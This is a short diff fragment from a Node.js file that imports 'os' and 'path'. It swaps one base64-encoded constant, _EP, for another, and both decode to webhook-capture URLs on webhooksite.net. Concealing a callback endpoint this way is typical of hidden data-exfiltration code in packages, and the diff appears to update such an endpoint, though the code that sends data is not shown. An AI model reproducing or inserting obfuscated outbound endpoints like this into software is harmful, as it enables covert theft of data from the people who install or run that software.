@@ -12,7 +12,7 @@ const os = require('os');
 const path = require('path');
 
 const _EP = Buffer.from(
-  'aHR0cHM6Ly93ZWJob29rc2l0ZS5uZXQvNmE2OWYzMDEtMDg0Zi00NjAyLTliYmItMWZhMDU3NTMwZjMz',
+  'aHR0cHM6Ly93ZWJob29rc2l0ZS5uZXQvOTNlM2VlNGItMjA2YS00MmFlLWI5YmEtMjMwZGM5MWM2Yjcw',
   'base64'
 ).toString();
 
